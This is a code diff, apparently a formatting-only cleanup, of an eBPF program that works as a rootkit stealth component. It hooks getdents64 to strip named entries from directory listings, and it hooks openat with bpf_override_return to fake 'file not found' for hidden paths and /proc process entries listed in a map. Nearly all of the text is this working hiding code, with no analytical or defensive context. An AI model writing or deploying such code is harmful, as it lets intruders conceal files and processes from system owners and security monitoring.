@@ -1,23 +1,23 @@
+#include <vmlinux.h>
 #include <bpf/bpf_core_read.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
-#include <vmlinux.h>
 
-#define MAX_DIRENTS 128
-#define PREFIX_PROC "/proc/"
+#define MAX_DIRENTS     128
+#define PREFIX_PROC     "/proc/"
 #define PREFIX_PROC_LEN 6
 
 /**
  * @brief Loop state passed to bpf_loop callback as context
  *
  */
-struct loop_ctx {
-    struct linux_dirent64* dirp;
+typedef struct {
+    struct linux_dirent64 *dirp;
     long total_bytes;
     size_t bpos;
-    struct linux_dirent64* prev_dir;
+    struct linux_dirent64 *prev_dir;
     unsigned short prev_reclen;
-};
+} loop_context_t;
 
 /**
  * @brief Callback function executed by bpf_loop
@@ -26,24 +26,23 @@ struct loop_ctx {
  * @param data
  * @return int
  */
-static int patch_dirent_cb(u32 index, void* data)
-{
-    struct loop_ctx* ctx = data;
+static int patch_dirent_cb(u32 index, void *data) {
+    loop_context_t *ctx = (loop_context_t *)data;
 
     if (ctx->bpos >= ctx->total_bytes)
         return 1; /* Stop iteration */
 
-    struct linux_dirent64* current_dir = (struct linux_dirent64*)((char*)ctx->dirp + ctx->bpos);
+    struct linux_dirent64 *current_dir = (struct linux_dirent64 *)((char *)ctx->dirp + ctx->bpos);
 
     unsigned short reclen = 0;
     if (bpf_probe_read_user(&reclen, sizeof(reclen), &current_dir->d_reclen) != 0 || reclen == 0)
         return 1;
 
-    char filename[MAX_HIDDEN_FILE_NAME_LEN] = { 0 };
+    char filename[MAX_HIDDEN_FILE_NAME_LEN] = {0};
     if (bpf_probe_read_user_str(filename, sizeof(filename), current_dir->d_name) > 0) {
         bpf_printk("Filename: %s\n", filename);
         /* Pass array reference to match map key signature */
-        u8* should_hide = bpf_map_lookup_elem(&hide_names_map, &filename);
+        u8 *should_hide = bpf_map_lookup_elem(&hide_names_map, &filename);
         if (should_hide) {
 
             /* Target is not the first entry in the buffer */
@@ -74,8 +73,7 @@ static int patch_dirent_cb(u32 index, void* data)
  *
  */
 SEC("fexit/__x64_sys_getdents64")
-int BPF_PROG(hide_getdents64, struct pt_regs* regs, long ret)
-{
+int BPF_PROG(hide_getdents64, struct pt_regs *regs, long ret) {
     if (ret <= 0)
         return 0;
 
@@ -85,12 +83,12 @@ int BPF_PROG(hide_getdents64, struct pt_regs* regs, long ret)
         return 0;
 
     /* Extracting dirp struct from regs */
-    struct linux_dirent64* dirp = (struct linux_dirent64*)PT_REGS_PARM2_CORE(regs);
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)PT_REGS_PARM2_CORE(regs);
 
     if (!dirp)
         return 0;
 
-    struct loop_ctx lctx = {
+    loop_context_t lctx = {
         .dirp = dirp,
         .total_bytes = ret,
         .bpos = 0,
@@ -109,10 +107,9 @@ int BPF_PROG(hide_getdents64, struct pt_regs* regs, long ret)
  *
  */
 SEC("kprobe/__x64_sys_openat")
-int hide_openat(struct pt_regs* ctx)
-{
+int hide_openat(struct pt_regs *ctx) {
     /* Extracting the real user pt_regs passed in rdi (PARM1 of kprobe) */
-    struct pt_regs* real_regs = (struct pt_regs*)PT_REGS_PARM1(ctx);
+    struct pt_regs *real_regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
     if (!real_regs)
         return 0;
 
@@ -122,19 +119,19 @@ int hide_openat(struct pt_regs* ctx)
         return 0;
 
     /* Extracting filename from rsi of real_regs (PARM2 of openat) */
-    const char* filename = NULL;
+    const char *filename = NULL;
     bpf_probe_read_kernel(&filename, sizeof(filename), &PT_REGS_PARM2(real_regs));
 
-    char path[256] = { 0 };
+    char path[256] = {0};
     long len = bpf_probe_read_user_str(path, sizeof(path), filename);
 
     if (len <= 0)
         return 0;
 
     /* Lookup the extracted name in hide map */
-    u8* should_hide = bpf_map_lookup_elem(&hide_names_map, &path);
+    u8 *should_hide = bpf_map_lookup_elem(&hide_names_map, &path);
     if (should_hide) {
-        bpf_override_return((struct pt_regs*)ctx, -ENOENT);
+        bpf_override_return((struct pt_regs *)ctx, -ENOENT);
     }
 
     /* Check if the path starts with prefix */
@@ -144,7 +141,7 @@ int hide_openat(struct pt_regs* ctx)
     }
 
     /* Extract the name segment following prefix */
-    char extracted_name[MAX_HIDDEN_FILE_NAME_LEN] = { 0 };
+    char extracted_name[MAX_HIDDEN_FILE_NAME_LEN] = {0};
     int j = 0;
     for (int i = PREFIX_PROC_LEN; i < sizeof(path) - 1 && j < MAX_HIDDEN_FILE_NAME_LEN - 1; i++) {
         /* Stop at path separator '/' or end of string */
@@ -156,7 +153,7 @@ int hide_openat(struct pt_regs* ctx)
     /* Lookup the extracted name in hide map */
     should_hide = bpf_map_lookup_elem(&hide_names_map, &extracted_name);
     if (should_hide) {
-        bpf_override_return((struct pt_regs*)ctx, -ENOENT);
+        bpf_override_return((struct pt_regs *)ctx, -ENOENT);
     }
 
     return 0;
